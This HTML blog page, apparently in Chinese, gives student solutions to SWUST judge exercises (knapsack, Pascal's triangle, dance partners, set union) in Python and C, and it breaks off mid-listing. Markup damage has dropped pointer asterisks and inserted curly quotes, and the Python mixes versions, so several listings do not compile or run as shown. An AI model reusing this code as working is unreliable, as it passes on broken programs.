title="描述"></a>描述</h2><blockquote><p>设有一个背包可以放入的物品重量为S，现有n件物品，重量分别是w1，w2，w3，…，wn。问能否从这n件物品中选择若干件放入背包中，使得放入的重量之和正好为S。如果有满足条件的选择，则此背包有解，否则此背包问题无解。</p></blockquote><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><blockquote><p>第一行为物品重量S（整数）；<br>第二行为物品数量n，<br>第三行为n件物品的重量的序列。</p></blockquote><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><blockquote><p>有解就输出”yes!“，没有解就输出”no!“。</p></blockquote><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">20</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">1</span> <span class="number">3</span> <span class="number">5</span> <span class="number">7</span> <span class="number">9</span></span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yes!</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="963-3"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">def pack(weight,amonut):</span><br><span class="line">    <span class="keyword">if</span> weight == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> weight &lt; <span class="number">0</span> <span class="keyword">or</span> (weight &gt; <span class="number">0</span> <span class="keyword">and</span> amonut &lt; <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> pack(weight - get_weight[amonut - <span class="number">1</span>],amonut - <span class="number">1</span> ):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> pack(weight,amonut - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">get_weight = []</span><br><span class="line">weight = <span class="keyword">int</span>(input())</span><br><span class="line">amount = <span class="keyword">int</span>(input())</span><br><span class="line">get_weight = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">int</span>,raw_input().split()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> pack(weight, amount):</span><br><span class="line">    sys.<span class="built_in">stdout</span>.write(<span class="string">“yes!”</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sys.<span class="built_in">stdout</span>.write(<span class="string">“no!”</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="963-4"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> get_weight[<span class="number">100</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pack</span><span class="params">(<span class="keyword">int</span> weight,<span class="keyword">int</span> amonut)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(weight==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(weight&lt;<span class="number">0</span>||(weight&gt;<span class="number">0</span>&amp;&amp;amonut&lt;<span class="number">1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pack(weight-get_weight[amonut<span class="number">-1</span>],amonut<span class="number">-1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> pack(weight,amonut<span class="number">-1</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> weight,amonut;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d%d”</span>,&amp;weight,&amp;amonut);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;amonut;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;get_weight[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pack(weight,amonut))</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">“yes!”</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">“no!”</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div></div></div><h1 id="966-打印杨辉三角形"><a href="#966-打印杨辉三角形" class="headerlink" title="[966] 打印杨辉三角形"></a>[966] 打印杨辉三角形</h1><div class="tabs" id="966"><ul class="nav-tabs"><li class="tab active"><a href="#966-1">思路</a></li><li class="tab"><a href="#966-2">题目描述</a></li><li class="tab"><a href="#966-3">python代码实现</a></li><li class="tab"><a href="#966-4">数据结构实现</a></li></ul><div class="tab-content"><div class="tab-pane active" id="966-1"><div class="note default"><blockquote><br><p>打印。</p><br></blockquote></div></div><div class="tab-pane" id="966-2"><p><a href="http://acm.swust.edu.cn/#/problems/966/-1?_k=9hpwdf" target="_blank" rel="noopener">传送门</a></p><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><blockquote><p>杨辉三角形具有如下特征： 1、每行数字左右对称，由1开始逐渐变大，然后变小，回到1。 2、第n行的数字个数为n个。 3、第n行数字和为2^(n－1)。 4、每个数字等于上一行的左右两个数字之和。可用此性质写出整个帕斯卡三角形。 5、将第2n+1行第1个数，跟第2n+2行第3个数、第2n+3行第5个数……连成一线，这些数的和是第2n个斐波那契数。将第2n行第2个数，跟第2n+1行第4个数、第2n+2行第6个数……这些数之和是第2n-1个斐波那契数。 6、第n行的第1个数为1，第二个数为1×(n-1)，第三个数为1×(n-1)×（n-2）/2，第四个数为1×(n-1)×（n-2）/2×（n-3）/3…依此类推。例如7阶杨辉三角形如下： 1 1 1 1 2 1 1 3 3 1 1 4 6 4 1 1 5 10 10 5 1 1 6 15 20 15 6 1 要求：利用循环队列，编程实现打印杨辉三角形。（n在0-12之间取值）</p></blockquote><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><blockquote><p>输入要打印的杨辉三角形的阶n。</p></blockquote><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><blockquote><p>打印出n阶杨辉三角形。</p></blockquote><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">7</span></span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">3</span> <span class="number">3</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">4</span> <span class="number">6</span> <span class="number">4</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">5</span> <span class="number">10</span> <span class="number">10</span> <span class="number">5</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">6</span> <span class="number">15</span> <span class="number">20</span> <span class="number">15</span> <span class="number">6</span> <span class="number">1</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="966-3"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">def disp(i, j):</span><br><span class="line">    <span class="keyword">if</span> j == <span class="number">1</span> <span class="keyword">or</span> j == i:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> disp(i - <span class="number">1</span>, j - <span class="number">1</span>) + disp(i - <span class="number">1</span>, j)</span><br><span class="line"></span><br><span class="line">n = <span class="keyword">int</span>(input())</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">1</span>,n + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j in range(<span class="number">1</span>, i+<span class="number">1</span>):</span><br><span class="line">        print disp(i,j),</span><br><span class="line">    print <span class="string">“\n”</span>,</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="966-4"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">disp</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((j==<span class="number">1</span>)||(j==i))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> (disp(i<span class="number">-1</span>,j<span class="number">-1</span>)+disp(i<span class="number">-1</span>,j));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;i+<span class="number">1</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">“%d “</span>,disp(i,j));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">“\n”</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div><h1 id="1027-舞伴问题"><a href="#1027-舞伴问题" class="headerlink" title="[1027] 舞伴问题"></a>[1027] 舞伴问题</h1><div class="tabs" id="1027"><ul class="nav-tabs"><li class="tab active"><a href="#1027-1">思路</a></li><li class="tab"><a href="#1027-2">题目描述</a></li><li class="tab"><a href="#1027-3">python代码实现</a></li><li class="tab"><a href="#1027-4">数据结构实现</a></li></ul><div class="tab-content"><div class="tab-pane active" id="1027-1"><div class="note default"><blockquote><br><p>循环</p><br></blockquote></div></div><div class="tab-pane" id="1027-2"><p><a href="http://acm.swust.edu.cn/#/problems/1027/-1?_k=7p4469" target="_blank" rel="noopener">传送门</a></p><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><blockquote><p>假设在周末舞会上，男士们和女士们进入舞厅时，各自排成一队。跳舞开始时，依次从男队和女队的队头上各出一人配成舞伴。若两队初始人数不相同，则较长的那一队中未配对者等待下一轮舞曲。要求编写程序实现舞伴问题。</p></blockquote><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><blockquote><p>输入一共5行，<br>第一行是男生人数m；<br>第二行依次是男生的姓名；<br>第三行是女士的人数n；<br>第四行依次是女士的姓名；<br>第五行是跳舞的轮数。</p></blockquote><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><blockquote><p>配对的男士和女士的姓名。</p></blockquote><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span></span><br><span class="line">A B C D E</span><br><span class="line"><span class="number">3</span></span><br><span class="line">F G H</span><br><span class="line"><span class="number">2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B G</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="1027-3"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">n = <span class="keyword">int</span>(input())</span><br><span class="line">a = <span class="built_in">list</span>(raw_input().split())</span><br><span class="line"></span><br><span class="line">m = <span class="keyword">int</span>(input())</span><br><span class="line">b = <span class="built_in">list</span>(raw_input().split())</span><br><span class="line"></span><br><span class="line">k = <span class="keyword">int</span>(input())</span><br><span class="line"></span><br><span class="line">sys.stdout.write(‘%c %c’%(a[(k-1)%n], b[(k-1)%m]))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="1027-4"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> data[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> front,rear;</span><br><span class="line">&#125;<span class="built_in">queue</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initqueue</span><span class="params">(<span class="built_in">queue</span> <em>&amp;q)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    q=(<span class="built_in">queue</span> )<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">queue</span>));</span><br><span class="line">    q-&gt;front=q-&gt;rear=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inqueue</span><span class="params">(<span class="built_in">queue</span> <em>&amp;q,<span class="keyword">int</span> max)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> e;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;max;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">“%c”</span>,&amp;e);</span><br><span class="line">        q-&gt;data[q-&gt;rear]=e;</span><br><span class="line">        q-&gt;rear=(q-&gt;rear+<span class="number">1</span>)%max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="built_in">queue</span> &amp;q1,<span class="built_in">queue</span> <em>&amp;q2,<span class="keyword">int</span> time,<span class="keyword">int</span> max1,<span class="keyword">int</span> max2)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;time<span class="number">-1</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        q1-&gt;front=(q1-&gt;front+<span class="number">1</span>)%max1;</span><br><span class="line">        q2-&gt;front=(q2-&gt;front+<span class="number">1</span>)%max2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">“%c %c”</span>,q1-&gt;data[q1-&gt;front],q2-&gt;data[q2-&gt;front]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">queue</span> la,*lb;</span><br><span class="line">    <span class="keyword">int</span> max1,max2,time;</span><br><span class="line">    </span><br><span class="line">    initqueue(la);</span><br><span class="line">    initqueue(lb);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;max1);</span><br><span class="line">    inqueue(la,max1);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;max2);</span><br><span class="line">    inqueue(lb,max2);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;time);</span><br><span class="line">    </span><br><span class="line">    print(la,lb,time,max1,max2);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div><h1 id="1037-集合的并运算的实现"><a href="#1037-集合的并运算的实现" class="headerlink" title="[1037] 集合的并运算的实现"></a>[1037] 集合的并运算的实现</h1><div class="tabs" id="1037"><ul class="nav-tabs"><li class="tab active"><a href="#1037-1">思路</a></li><li class="tab"><a href="#1037-2">题目描述</a></li><li class="tab"><a href="#1037-3">python代码实现</a></li><li class="tab"><a href="#1037-4">数据结构实现</a></li></ul><div class="tab-content"><div class="tab-pane active" id="1037-1"><div class="note default"><blockquote><br><p>并</p><br></blockquote></div></div><div class="tab-pane" id="1037-2"><p><a href="http://acm.swust.edu.cn/#/problems/1037/-1?_k=6leg67" target="_blank" rel="noopener">传送门</a></p><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><blockquote><p>假设有两个集合 A 和 B 分别用两个线性表 LA 和 LB 表示，即线性表中的数据元素即为集合中的成员。编程实现集合A和集合B的并运算。</p></blockquote><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><blockquote><p>第一行为集合A的数据元素个数n 第二行输入n个集合A的数据元素 第三行为集合B的数据元素的个数； 第四行输入m个集合B的数据元素。</p></blockquote><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><blockquote><p>第一行为A和B的并集.</p></blockquote><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">0</span> <span class="number">5</span> <span class="number">6</span> <span class="number">3</span> <span class="number">8</span> <span class="number">7</span> <span class="number">9</span> <span class="number">10</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="number">1</span> <span class="number">3</span> <span class="number">4</span> <span class="number">7</span> <span class="number">8</span> <span class="number">9</span> <span class="number">5</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="number">5</span> <span class="number">6</span> <span class="number">3</span> <span class="number">8</span> <span class="number">7</span> <span class="number">9</span> <span class="number">10</span> <span class="number">1</span> <span class="number">4</span> </span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="1037-3"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">a = []</span><br><span class="line">n1 = <span class="keyword">int</span>(input())</span><br><span class="line">a = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">int</span>,raw_input().split()))</span><br><span class="line"></span><br><span class="line">b = []</span><br><span class="line">n2 = <span class="keyword">int</span>(input())</span><br><span class="line">b = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">int</span>,raw_input().split()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(len(a)):</span><br><span class="line">    print a[i],</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(len(b)):</span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j in range(len(a)):</span><br><span class="line">        <span class="keyword">if</span> b[i] == a[j]:</span><br><span class="line">            k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">0</span> : print b[i],</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="1037-4"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> data[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;sqlist;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initlist</span><span class="params">(sqlist <em>&amp;l)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    l=(sqlist )<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(sqlist));</span><br><span class="line">    l-&gt;length=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">creatlist</span><span class="params">(sqlist <em>&amp;l,<span class="keyword">int</span> n)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;l-&gt;data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    l-&gt;length=n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">combinelist</span><span class="params">(sqlist l,sqlist <em>s)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;l-&gt;length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">“%d “</span>,l-&gt;data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s-&gt;length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> k=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;l-&gt;length;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(l-&gt;data[j]==s-&gt;data[i])</span><br><span class="line">            &#123;</span><br><span class="line">                k=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(k==<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">“%d “</span>,s-&gt;data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span 